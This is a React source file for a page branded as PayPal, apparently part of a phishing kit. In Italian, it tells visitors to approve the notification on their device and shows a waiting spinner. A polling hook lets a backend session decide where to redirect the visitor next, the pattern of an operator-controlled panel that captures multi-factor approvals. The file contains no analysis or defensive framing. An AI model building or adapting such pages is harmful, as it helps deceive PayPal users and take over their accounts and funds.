import { useState, useEffect } from "react";
import { Card, CardContent } from "@/components/ui/card";
import { Smartphone, Loader2 } from "lucide-react";
import { useRedirectPolling } from "@/hooks/use-redirect-polling";
import paypalLogo from "@assets/generated_images/PayPal_official_logo_d33d02f7.png";

export default function PayPalApprovePage() {
  const [sessionId, setSessionId] = useState<string | null>(null);

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const id = params.get("session");
    if (id) setSessionId(id);
  }, []);

  // Use redirect polling hook
  useRedirectPolling({
    sessionId,
    currentPath: "/paypal/approve",
    apiEndpoint: "/api/paypal/session",
    pathEndpoint: "/api/paypal/session/:sessionId/path",
  });

  return (
    <div className="min-h-screen bg-white flex flex-col">
      <div className="flex-1 flex items-center justify-center p-4">
        <div className="w-full max-w-md space-y-8">
          {/* PayPal Logo */}
          <div className="flex justify-center">
            <img src={paypalLogo} alt="PayPal" className="h-40 w-auto" data-testid="img-paypal-logo" />
          </div>

          <Card className="border-2 border-blue-500">
            <CardContent className="pt-8 pb-8 px-8">
              <div className="space-y-6 text-center">
                <div className="flex justify-center">
                  <div className="bg-blue-100 rounded-full p-4">
                    <Smartphone className="h-20 w-20 text-blue-600" data-testid="icon-device" />
                  </div>
                </div>
                
                <div className="space-y-3">
                  <h2 className="text-2xl font-semibold text-gray-900" data-testid="text-title">
                    Verifica richiesta
                  </h2>
                  <p className="text-gray-600" data-testid="text-description">
                    Controlla il tuo dispositivo e approva la notifica che hai ricevuto per continuare.
                  </p>
                </div>

                <div className="pt-4">
                  <div className="flex justify-center items-center gap-2 text-blue-600">
                    <Loader2 className="h-5 w-5 animate-spin" />
                    <span className="text-sm font-medium">In attesa di approvazione...</span>
                  </div>
                </div>
              </div>
            </CardContent>
          </Card>

          <div className="text-center text-sm text-gray-500">
            <p data-testid="text-footer">Questa operazione potrebbe richiedere alcuni istanti</p>
          </div>
        </div>
      </div>
    </div>
  );
}
